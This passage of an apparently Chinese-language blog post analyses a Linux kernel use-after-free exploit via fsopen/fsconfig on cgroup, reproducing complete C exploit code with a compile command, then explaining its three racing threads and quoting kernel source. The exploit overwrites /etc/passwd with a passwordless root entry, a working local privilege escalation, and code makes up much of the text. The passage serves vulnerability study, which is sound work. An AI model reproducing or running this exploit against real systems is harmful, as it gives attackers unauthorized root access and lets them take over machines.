203, 254);">ifndef</span> __NR_fsconfig</span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">define</span> __NR_fsconfig 431</span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">endif</span></span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">ifndef</span> __NR_fsopen</span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">define</span> __NR_fsopen 430</span><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">endif</span></span><br /><br /><span style="color: rgb(124, 124, 124);">#<span style="color: rgb(150, 203, 254);">define</span> MAX_FILE_NUM 1000</span><br /><span style="color: rgb(255, 255, 182);">int</span> uaf_fd;<br /><span style="color: rgb(255, 255, 182);">int</span> fds[MAX_FILE_NUM];<br /><br /><span style="color: rgb(255, 255, 182);">int</span> run_write = <span style="color: rgb(255, 115, 253);">0</span>;<br /><span style="color: rgb(255, 255, 182);">int</span> run_spray = <span style="color: rgb(255, 115, 253);">0</span>;<br /><span style="color: rgb(255, 255, 182);">char</span> *cwd;<br /><br /><span style="color: rgb(255, 255, 182);">void</span> *<span style="color: rgb(255, 255, 182);">slow_write</span>() {<br />    printf(<span style="color: rgb(168, 255, 96);">"start slow write to get the lock\n"</span>);    <span style="color: rgb(255, 255, 182);">int</span> fd = open(<span style="color: rgb(168, 255, 96);">"./uaf"</span>, <span style="color: rgb(255, 115, 253);">1</span>);<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (fd &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />        perror(<span style="color: rgb(168, 255, 96);">"error open uaf file"</span>);<br />        exit(<span style="color: rgb(255, 115, 253);">-1</span>);<br />    }<br /><br />    <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> <span style="color: rgb(255, 255, 182);">int</span> addr = <span style="color: rgb(255, 115, 253);">0x30000000</span>;<br />    <span style="color: rgb(255, 255, 182);">int</span> offset;<br />    <span style="color: rgb(150, 203, 254);">for</span> (offset = <span style="color: rgb(255, 115, 253);">0</span>; offset &lt; <span style="color: rgb(255, 115, 253);">0x80000</span>; offset++) {<br />        <span style="color: rgb(255, 255, 182);">void</span> *r = mmap((<span style="color: rgb(255, 255, 182);">void</span> *)(addr + offset * <span style="color: rgb(255, 115, 253);">0x1000</span>), <span style="color: rgb(255, 115, 253);">0x1000</span>,<br />                       PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(255, 115, 253);">0</span>);<br />        <span style="color: rgb(150, 203, 254);">if</span> (r &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />            printf(<span style="color: rgb(168, 255, 96);">"allocate failed at 0x%x\n"</span>, offset);<br />        }<br />    }<br /><br />    assert(offset &gt; <span style="color: rgb(255, 115, 253);">0</span>);<br /><br />    <span style="color: rgb(255, 255, 182);">void</span> *mem = (<span style="color: rgb(255, 255, 182);">void</span> *)(addr);<br />    memcpy(mem, <span style="color: rgb(168, 255, 96);">"hhhhh"</span>, <span style="color: rgb(255, 115, 253);">5</span>);<br /><br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">iovec</span> iov[<span style="color: rgb(255, 115, 253);">5</span>];<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; <span style="color: rgb(255, 115, 253);">5</span>; i++) {<br />        iov[i].iov_base = mem;<br />        iov[i].iov_len = (offset - <span style="color: rgb(255, 115, 253);">1</span>) * <span style="color: rgb(255, 115, 253);">0x1000</span>;<br />    }<br /><br />    run_write = <span style="color: rgb(255, 115, 253);">1</span>;<br />    <span style="color: rgb(150, 203, 254);">if</span> (writev(fd, iov, <span style="color: rgb(255, 115, 253);">5</span>) &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />        perror(<span style="color: rgb(168, 255, 96);">"slow write"</span>);<br />    }<br />    printf(<span style="color: rgb(168, 255, 96);">"write done!\n"</span>);}<br /><br /><span style="color: rgb(255, 255, 182);">void</span> *<span style="color: rgb(255, 255, 182);">write_cmd</span>() {<br />    <span style="color: rgb(255, 255, 182);">char</span> data[<span style="color: rgb(255, 115, 253);">1024</span>] = <span style="color: rgb(168, 255, 96);">"root::0:0:root:/root:/bin/sh\n\n"</span>;<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">iovec</span> iov = {.iov_base = data, .iov_len = strlen(data)};<br /><br />    <span style="color: rgb(150, 203, 254);">while</span> (!run_write) {<br />    }<br />    run_spray = <span style="color: rgb(255, 115, 253);">1</span>;<br />    <span style="color: rgb(150, 203, 254);">if</span> (writev(uaf_fd, &amp;iov, <span style="color: rgb(255, 115, 253);">1</span>) &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />        printf(<span style="color: rgb(168, 255, 96);">"failed to write\n"</span>);<br />    }<br />    printf(<span style="color: rgb(168, 255, 96);">"overwrite done! It should be after the slow write\n"</span>);}<br /><br /><span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">spray_files</span>() {<br /><br />    <span style="color: rgb(150, 203, 254);">while</span> (!run_spray) {<br />    }<br />    <span style="color: rgb(255, 255, 182);">int</span> found = <span style="color: rgb(255, 115, 253);">0</span>;<br /><br />    printf(<span style="color: rgb(168, 255, 96);">"got uaf fd %d, start spray....\n"</span>, uaf_fd);    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; MAX_FILE_NUM; i++) {<br />        fds[i] = open(<span style="color: rgb(168, 255, 96);">"/etc/passwd"</span>, O_RDONLY);<br />        <span style="color: rgb(150, 203, 254);">if</span> (fds[i] &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />            perror(<span style="color: rgb(168, 255, 96);">"open file"</span>);<br />            printf(<span style="color: rgb(168, 255, 96);">"%d\n"</span>, i);<br />        }<br />        <span style="color: rgb(150, 203, 254);">if</span> (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, fds[i]) ==<br />            <span style="color: rgb(255, 115, 253);">0</span>) {<br />            found = <span style="color: rgb(255, 115, 253);">1</span>;<br />            printf(<span style="color: rgb(168, 255, 96);">"[!] found, file id %d\n"</span>, i);<br />            <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> j = <span style="color: rgb(255, 115, 253);">0</span>; j &lt; i; j++)<br />                close(fds[j]);<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        }<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (found) {<br />        sleep(<span style="color: rgb(255, 115, 253);">4</span>);<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">-1</span>;<br />}<br /><br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">trigger</span>() {<br />    <span style="color: rgb(255, 255, 182);">int</span> fs_fd = syscall(__NR_fsopen, <span style="color: rgb(168, 255, 96);">"cgroup"</span>, <span style="color: rgb(255, 115, 253);">0</span>);<br />    <span style="color: rgb(150, 203, 254);">if</span> (fs_fd &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />        perror(<span style="color: rgb(168, 255, 96);">"fsopen"</span>);<br />        die(<span style="color: rgb(168, 255, 96);">""</span>);<br />    }<br /><br />    symlink(<span style="color: rgb(168, 255, 96);">"./data"</span>, <span style="color: rgb(168, 255, 96);">"./uaf"</span>);<br /><br />    uaf_fd = open(<span style="color: rgb(168, 255, 96);">"./uaf"</span>, <span style="color: rgb(255, 115, 253);">1</span>);<br />    <span style="color: rgb(150, 203, 254);">if</span> (uaf_fd &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />        die(<span style="color: rgb(168, 255, 96);">"failed to open symbolic file\n"</span>);<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (syscall(__NR_fsconfig, fs_fd, <span style="color: rgb(255, 115, 253);">5</span>, <span style="color: rgb(168, 255, 96);">"source"</span>, <span style="color: rgb(255, 115, 253);">0</span>, uaf_fd)) {<br />        perror(<span style="color: rgb(168, 255, 96);">"fsconfig"</span>);<br />        exit(<span style="color: rgb(255, 115, 253);">-1</span>);<br />    }<br />    <span style="color: rgb(124, 124, 124);">// free the uaf fd</span><br />    close(fs_fd);<br />}<br /><br /><span style="color: rgb(255, 255, 182);">void</span> <span style="color: rgb(255, 255, 182);">loop</span>() {<br />    trigger();<br /><br />    <span style="color: rgb(255, 255, 182);">pthread_t</span> p_id;<br />    pthread_create(&amp;p_id, <span style="color: rgb(198, 197, 254);">NULL</span>, slow_write, <span style="color: rgb(198, 197, 254);">NULL</span>);<br /><br />    <span style="color: rgb(255, 255, 182);">pthread_t</span> p_id_cmd;<br />    pthread_create(&amp;p_id_cmd, <span style="color: rgb(198, 197, 254);">NULL</span>, write_cmd, <span style="color: rgb(198, 197, 254);">NULL</span>);<br />    exit(spray_files());<br />}<br /><br /><span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">main</span>(<span style="color: rgb(255, 255, 182);">void</span>) {<br />    cwd = get_current_dir_name();<br />    syscall(__NR_mmap, <span style="color: rgb(255, 115, 253);">0x1ffff000</span>ul, <span style="color: rgb(255, 115, 253);">0x1000</span>ul, <span style="color: rgb(255, 115, 253);">0ul</span>, <span style="color: rgb(255, 115, 253);">0x32</span>ul, <span style="color: rgb(255, 115, 253);">-1</span>, <span style="color: rgb(255, 115, 253);">0ul</span>);<br />    syscall(__NR_mmap, <span style="color: rgb(255, 115, 253);">0x20000000</span>ul, <span style="color: rgb(255, 115, 253);">0x1000000</span>ul, <span style="color: rgb(255, 115, 253);">7ul</span>, <span style="color: rgb(255, 115, 253);">0x32</span>ul, <span style="color: rgb(255, 115, 253);">-1</span>, <span style="color: rgb(255, 115, 253);">0ul</span>);<br />    syscall(__NR_mmap, <span style="color: rgb(255, 115, 253);">0x21000000</span>ul, <span style="color: rgb(255, 115, 253);">0x1000</span>ul, <span style="color: rgb(255, 115, 253);">0ul</span>, <span style="color: rgb(255, 115, 253);">0x32</span>ul, <span style="color: rgb(255, 115, 253);">-1</span>, <span style="color: rgb(255, 115, 253);">0ul</span>);<br />    use_temporary_dir();<br />    do_sandbox_namespace();<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />}</code></pre><p>编译命令为 <code style="font-family: SFMono-Regular, Consolas, ;">gcc -g exp.c -o exp -static -lpthread</code></p><p>这里我很简单地将 <code style="font-family: SFMono-Regular, Consolas, ;">/etc/passwd</code> 的第一项写成 <code style="font-family: SFMono-Regular, Consolas, ;">root::0:0:root:/root:/bin/sh\n\n</code>，去掉其中的 <code style="font-family: SFMono-Regular, Consolas, ;">x</code> 让它没有密码。</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=fc3af972&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKLrWW7Tu4GunpcnI8hGt1DfXlY3tJAibzlVtiauUO4FzALSYRyXoVGNBQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>可以发现漏洞是存在的。</p><h3>原理概述</h3><p>通过阅读 论文原文 能大概知道 EXP 的利用思路。</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=70a28405&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKM6ZYVOPuibj4rjpdVrBmAlZAHsKagh2jZA8HzZRCd7Xibkkf0iaibibzVuw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>步骤是先打开一个具有写权限的本地文件，对其写入内容，在写文件的时候，内核会检查你的权限，随后再去写，在检查完权限，写之前可以 free 掉这个文件再立马打开特权文件（<code style="font-family: SFMono-Regular, Consolas, ;">/etc/passwd</code>），这样就可以达到绕过权限去写特权文件的操作了。</p><p>配合 EXP 来看看</p><h3>EXP分析</h3><p>从 <code style="font-family: SFMono-Regular, Consolas, ;">main</code> 函数开始，先调用 3 次 mmap 去分配内存，随后新建了一个 <code style="font-family: SFMono-Regular, Consolas, ;">exp_dir</code> 文件夹，并创建了 <code style="font-family: SFMono-Regular, Consolas, ;">data</code> 在该文件夹中。</p><h3>do_sandbox_namespace</h3><p><code style="font-family: SFMono-Regular, Consolas, ;">setup_common</code> 函数挂载了一个 FUSE 文件系统，但是测试下来挂载不成功也不影响 EXP 的使用，随后 mprotect 改变内存属性（这里不是很清楚为什么把栈的属性清零）。随后循环</p><p>在循环中调用 <code style="font-family: SFMono-Regular, Consolas, ;">clone</code> 去启动一个新的进程，一般来说，<code style="font-family: SFMono-Regular, Consolas, ;">clone</code> 理解为 <code style="font-family: SFMono-Regular, Consolas, ;">fork</code> 没有问题。随后子进程执行 <code style="font-family: SFMono-Regular, Consolas, ;">namespace_sandbox_proc</code>，主进程等待子进程返回，那么来分析分析这个函数。</p><h4>sandbox_common</h4><p>先设置父进程死亡的信号为 <code style="font-family: SFMono-Regular, Consolas, ;">SIGKILL</code>，然后调用 <code style="font-family: SFMono-Regular, Consolas, ;">setsid()</code> 去脱离当前终端。随后做了一系列的限制，分别为</p><ul><li style="margin-left: 2px;"><p>地址空间限制（RLIMIT_AS）：限制了进程的虚拟内存空间大小为 200MB。</p></li><li style="margin-left: 2px;"><p>锁定内存限制（RLIMIT_MEMLOCK）：限制了进程锁定内存的大小为 32MB。</p></li><li style="margin-left: 2px;"><p>文件大小限制（RLIMIT_FSIZE）：限制了进程可以创建的文件大小为 136MB。</p></li><li style="margin-left: 2px;"><p>栈大小限制（RLIMIT_STACK）：限制了进程的栈大小为 1MB。</p></li><li style="margin-left: 2px;"><p>核心文件大小限制（RLIMIT_CORE）：禁止了进程生成核心转储文件。</p></li><li style="margin-left: 2px;"><p>打开文件描述符数量限制（RLIMIT_NOFILE）：限制了进程可以打开的文件描述符数量为 256。</p></li></ul><p>然后挂载创建一个新的命名空间，将当前命名空间的根文件系统挂载点设置为私有，再创建其它的一系列的命名空间。</p><p>随后写这些内核参数文件，这样就创建了一个合适的环境。</p><h4>loop</h4><h5>trigger</h5><p><code style="font-family: SFMono-Regular, Consolas, ;">fsopen</code> 打开一个文件系统 <code style="font-family: SFMono-Regular, Consolas, ;">cgroup</code>，将 <code style="font-family: SFMono-Regular, Consolas, ;">./uaf</code> 链接到 <code style="font-family: SFMono-Regular, Consolas, ;">./data</code> 上，又使用 <code style="font-family: SFMono-Regular, Consolas, ;">fsconfig</code> 进行了一些配置，在这个地方已经产生了 UAF 漏洞。</p><p>然后开启了两个线程分别启动 <code style="font-family: SFMono-Regular, Consolas, ;">slow_write</code> 和 <code style="font-family: SFMono-Regular, Consolas, ;">write_cmd</code>，主线程调用 <code style="font-family: SFMono-Regular, Consolas, ;">spray_files</code>。分别对应论文第一张图的线程 1，2，3。</p><p>那么可以发现，主要就是由这三个线程去操作了，之前一系列是为了进行一个环境配置在造成 UAF，因为并没有权限直接更改内核的某些参数，所以直接创建新的命名空间去操作的。</p><h5>slow_write</h5><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">void</span> *<span style="color: rgb(255, 255, 182);">slow_write</span>() {<br />    printf(<span style="color: rgb(168, 255, 96);">"start slow write to get the lock\n"</span>);    <span style="color: rgb(255, 255, 182);">int</span> fd = open(<span style="color: rgb(168, 255, 96);">"./uaf"</span>, <span style="color: rgb(255, 115, 253);">1</span>);<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (fd &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />        perror(<span style="color: rgb(168, 255, 96);">"error open uaf file"</span>);<br />        exit(<span style="color: rgb(255, 115, 253);">-1</span>);<br />    }<br /><br />    <span style="color: rgb(255, 255, 182);">unsigned</span> <span style="color: rgb(255, 255, 182);">long</span> <span style="color: rgb(255, 255, 182);">int</span> addr = <span style="color: rgb(255, 115, 253);">0x30000000</span>;<br />    <span style="color: rgb(255, 255, 182);">int</span> offset;<br />    <span style="color: rgb(150, 203, 254);">for</span> (offset = <span style="color: rgb(255, 115, 253);">0</span>; offset &lt; <span style="color: rgb(255, 115, 253);">0x80000</span>; offset++) {<br />        <span style="color: rgb(255, 255, 182);">void</span> *r = mmap((<span style="color: rgb(255, 255, 182);">void</span> *)(addr + offset * <span style="color: rgb(255, 115, 253);">0x1000</span>), <span style="color: rgb(255, 115, 253);">0x1000</span>,<br />                       PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(255, 115, 253);">0</span>);<br />        <span style="color: rgb(150, 203, 254);">if</span> (r &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />            printf(<span style="color: rgb(168, 255, 96);">"allocate failed at 0x%x\n"</span>, offset);<br />        }<br />    }<br /><br />    assert(offset &gt; <span style="color: rgb(255, 115, 253);">0</span>);<br /><br />    <span style="color: rgb(255, 255, 182);">void</span> *mem = (<span style="color: rgb(255, 255, 182);">void</span> *)(addr);<br />    memcpy(mem, <span style="color: rgb(168, 255, 96);">"hhhhh"</span>, <span style="color: rgb(255, 115, 253);">5</span>);<br /><br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">iovec</span> iov[<span style="color: rgb(255, 115, 253);">5</span>];<br />    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(255, 255, 182);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; <span style="color: rgb(255, 115, 253);">5</span>; i++) {<br />        iov[i].iov_base = mem;<br />        iov[i].iov_len = (offset - <span style="color: rgb(255, 115, 253);">1</span>) * <span style="color: rgb(255, 115, 253);">0x1000</span>;<br />    }<br /><br />    run_write = <span style="color: rgb(255, 115, 253);">1</span>;<br />    <span style="color: rgb(150, 203, 254);">if</span> (writev(fd, iov, <span style="color: rgb(255, 115, 253);">5</span>) &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />        perror(<span style="color: rgb(168, 255, 96);">"slow write"</span>);<br />    }<br />    printf(<span style="color: rgb(168, 255, 96);">"write done!\n"</span>);}</code></pre><p>打开文件去占据内核锁，去打开 <code style="font-family: SFMono-Regular, Consolas, ;">./uaf</code>，至于为什么打开 uaf，稍后分析内核源码可以获得具体原因。</p><p>这里面还分配了大量内存页，并尝试将所有页面写入文件，这一步通过文献的查阅可以得知是为了减缓写文件的速度，把写文件的时间线拉长就可以提高漏洞利用的成功率。</p><p>中间在开始写之前会设置一个全局变量去启动下一个线程。</p><h4>write_cmd</h4><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">void</span> *<span style="color: rgb(255, 255, 182);">write_cmd</span>() {<br />    <span style="color: rgb(255, 255, 182);">char</span> data[<span style="color: rgb(255, 115, 253);">1024</span>] = <span style="color: rgb(168, 255, 96);">"root::0:0:root:/root:/bin/sh\n\n"</span>;<br />    <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">iovec</span> iov = {.iov_base = data, .iov_len = strlen(data)};<br /><br />    <span style="color: rgb(150, 203, 254);">while</span> (!run_write) {<br />    }<br />    run_spray = <span style="color: rgb(255, 115, 253);">1</span>;<br />    <span style="color: rgb(150, 203, 254);">if</span> (writev(uaf_fd, &amp;iov, <span style="color: rgb(255, 115, 253);">1</span>) &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />        printf(<span style="color: rgb(168, 255, 96);">"failed to write\n"</span>);<br />    }<br />    printf(<span style="color: rgb(168, 255, 96);">"overwrite done! It should be after the slow write\n"</span>);}</code></pre><p>这一步就是等到第一个线程调用 <code style="font-family: SFMono-Regular, Consolas, ;">writev</code> 的时候启动第三个线程，然后再去写指定的数据。</p><h4>spray_files</h4><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">int</span> spray_files() {<br /><br />    <span style="color: rgb(150, 203, 254);">while</span> (!run_spray) {<br />    }<br />    <span style="color: rgb(150, 203, 254);">int</span> found = <span style="color: rgb(255, 115, 253);">0</span>;<br /><br />    <span style="color: rgb(150, 203, 254);">printf</span>(<span style="color: rgb(168, 255, 96);">"got uaf fd %d, start spray....\n"</span>, uaf_fd);    <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">int</span> i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; MAX_FILE_NUM; i++) {<br />        fds[i] = <span style="color: rgb(150, 203, 254);">open</span>(<span style="color: rgb(168, 255, 96);">"/etc/passwd"</span>, O_RDONLY);<br />        <span style="color: rgb(150, 203, 254);">if</span> (fds[i] &lt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />            perror(<span style="color: rgb(168, 255, 96);">"open file"</span>);<br />            <span style="color: rgb(150, 203, 254);">printf</span>(<span style="color: rgb(168, 255, 96);">"%d\n"</span>, i);<br />        }<br />        <span style="color: rgb(150, 203, 254);">if</span> (<span style="color: rgb(150, 203, 254);">syscall</span>(__NR_kcmp, getpid(), getpid(), KCMP_FILE, uaf_fd, fds[i]) ==<br />            <span style="color: rgb(255, 115, 253);">0</span>) {<br />            found = <span style="color: rgb(255, 115, 253);">1</span>;<br />            <span style="color: rgb(150, 203, 254);">printf</span>(<span style="color: rgb(168, 255, 96);">"[!] found, file id %d\n"</span>, i);<br />            <span style="color: rgb(150, 203, 254);">for</span> (<span style="color: rgb(150, 203, 254);">int</span> j = <span style="color: rgb(255, 115, 253);">0</span>; j &lt; i; j++)<br />                <span style="color: rgb(150, 203, 254);">close</span>(fds[j]);<br />            <span style="color: rgb(150, 203, 254);">break</span>;<br />        }<br />    }<br /><br />    <span style="color: rgb(150, 203, 254);">if</span> (found) {<br />        <span style="color: rgb(150, 203, 254);">sleep</span>(<span style="color: rgb(255, 115, 253);">4</span>);<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />    }<br />    <span style="color: rgb(150, 203, 254);">return</span> -<span style="color: rgb(255, 115, 253);">1</span>;<br />}</code></pre><p>连续地打开 <code style="font-family: SFMono-Regular, Consolas, ;">/etc/passwd</code> 文件，判断文件描述符和 <code style="font-family: SFMono-Regular, Consolas, ;">uaf_fd</code> 是否为同一文件，如果是那么设置 <code style="font-family: SFMono-Regular, Consolas, ;">found=1</code>。</p><p>在这个地方触发了漏洞导致了 uaf 文件描述符写入了 <code style="font-family: SFMono-Regular, Consolas, ;">/etc/passwd</code> 文件。</p><h2>源码分析</h2><p>选用对应源码版本：https://elixir.bootlin.com/linux/v5.13.3/source</p><h3>open</h3><p>在利用中线程 1 （局部变量 <code style="font-family: SFMono-Regular, Consolas, ;">fd</code>）和线程 2 （全局变量 <code style="font-family: SFMono-Regular, Consolas, ;">uaf_fd</code>）都打开了一个文件（<code style="font-family: SFMono-Regular, Consolas, ;">./uaf</code>），如果 <code style="font-family: SFMono-Regular, Consolas, ;">uaf</code> 是普通文件，那么 <code style="font-family: SFMono-Regular, Consolas, ;">FMODE_ATOMIC_POS</code> 这个标志位必定存在，但是如果是链接文件，则这里不会被设置这个标记，可以避免被卡在这个函数。</p><p>具体的代码可以查看 <code style="font-family: SFMono-Regular, Consolas, ;">open</code> 函数的调用，相关解释已加注释。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">static</span> int <span style="color: rgb(255, 255, 182);">do_dentry_open</span>(<span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file</span> *f,<br />                          <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">inode</span> *inode,<br />                          <span style="color: rgb(255, 255, 182);">int</span> (*open)(<span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">inode</span> *, <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file</span> *))<br />{<br />    <span style="color: rgb(150, 203, 254);">static</span> <span style="color: rgb(150, 203, 254);">const</span> <span style="color: rgb(150, 203, 254);">struct</span> <span style="color: rgb(255, 255, 182);">file_operations</span> empty_fops = {};<br />    int error;<br /><br />    <span style="color: rgb(255, 255, 182);">path_get</span>(&amp;f-&gt;f_path);<br />    f-&gt;f_inode = inode;<br />    f-&gt;f_mapping = inode-&gt;i_mapping;<br />    f-&gt;f_wb_err = <span style="color: rgb(255, 255, 182);">filemap_sample_wb_err</span>(f-&gt;f_mapping);<br />    f-&gt;f_sb_err = <span style="color: rgb(255, 255, 182);">file_sample_sb_err</span>(f);<br /><br />    <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">unlikely</span>(f-&gt;f_flags &amp; O_PATH)) {<br />        f-&gt;f_mode = FMODE_PATH | FMODE_OPENED;<br />        f-&gt;f_op = &amp;empty_fops;<br />        <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />    }<br /><br />    <span style="color: rgb(255, 255, 182);">if</span> (f-&gt;f_mode &amp; FMODE_WRITE &amp;&amp; !<span style="color: rgb(255, 255, 182);">special_file</span>(inode-&gt;i_mode)) {<br />        error = <span style="color: rgb(255, 255, 182);">get_write_access</span>(inode);<br />        <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">unlikely</span>(error))<br />            goto cleanup_file;<br />        error = __mnt_want_write(f-&gt;f_path.mnt);<br />        <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">unlikely</span>(error)) {<br />            <span style="color: rgb(255, 255, 182);">put_write_access</span>(inode);<br />            goto cleanup_file;<br />        }<br />        f-&gt;f_mode |= FMODE_WRITER;<br />    }<br /><br />    <span style="color: rgb(124, 124, 124);">/* POSIX.1-2008/SUSv4 Section XSI 2.9.7 */</span><br />    <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">S_ISREG</span>(inode-&gt;i_mode) || <span style="color: rgb(255, 255, 182);">S_ISDIR</span>(inode-&gt;i_mode))<br />        f-&gt;f_mode |= FMODE_ATOMIC_POS;<br /><span style="color: rgb(124, 124, 124);">//这里可以看到，如果打开的文件是目录（DIR）类型或者是常规（REG）类型的文件，则必定加上一个 FMODE_ATOMIC_POS 标记，因此需要通过建立链接来绕过</span><br />    f-&gt;f_op = <span style="color: rgb(255, 255, 182);">fops_get</span>(inode-&gt;i_fop);<br />    <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">WARN_ON</span>(!f-&gt;f_op)) {<br />        error = -ENODEV;<br />        goto cleanup_all;<br />    }<br /><span style="color: rgb(124, 124, 124);">//...这里省略了很多代码</span><br />cleanup_all:<br />    <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">WARN_ON_ONCE</span>(error &gt; <span style="color: rgb(255, 115, 253);">0</span>))<br />        error = -EINVAL;<br />    <span style="color: rgb(255, 255, 182);">fops_put</span>(f-&gt;f_op);<br />    <span style="color: rgb(255, 255, 182);">if</span> (f-&gt;f_mode &amp; FMODE_WRITER) {<br />        <span style="color: rgb(255, 255, 182);">put_write_access</span>(inode);<br />        __mnt_drop_write(f-&gt;f_path.mnt);<br />    }<br />cleanup_file:<br />    <span style="color: rgb(255, 255, 182);">path_put</span>(&amp;f-&gt;f_path);<br 